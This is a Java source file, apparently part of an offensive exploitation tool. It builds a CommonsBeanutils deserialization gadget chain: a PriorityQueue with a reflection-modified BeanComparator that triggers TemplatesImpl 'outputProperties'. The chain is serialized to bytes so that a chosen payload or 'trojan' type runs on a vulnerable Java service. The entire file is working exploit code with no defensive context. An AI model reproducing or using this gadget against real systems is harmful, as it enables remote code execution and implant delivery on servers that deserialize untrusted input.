package core.gadgets;

import core.enumtypes.PayloadType;
import core.gadgets.utils.Gadgets;
import core.gadgets.utils.Reflections;
import core.utils.Util;
import org.apache.commons.beanutils.BeanComparator;

import java.util.Comparator;
import java.util.PriorityQueue;
import java.util.Queue;


public class CommonsBeanutilsString  {
    public static Object getObject(PayloadType type, String trojanType) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(type, trojanType);
        BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);

        PriorityQueue<String> queue = new PriorityQueue(2, (Comparator<?>)beanComparator);

        queue.add("1");
        queue.add("1");

        Reflections.setFieldValue(queue, "queue", new Object[] { templates, templates });

        Reflections.setFieldValue(beanComparator, "property", "outputProperties");

        return (Queue)queue;
    }

    public static byte[] getByte(PayloadType type, String trojanType) throws Exception {
        Object val = getObject(type, trojanType);
        return Util.serialize(val);
    }
}



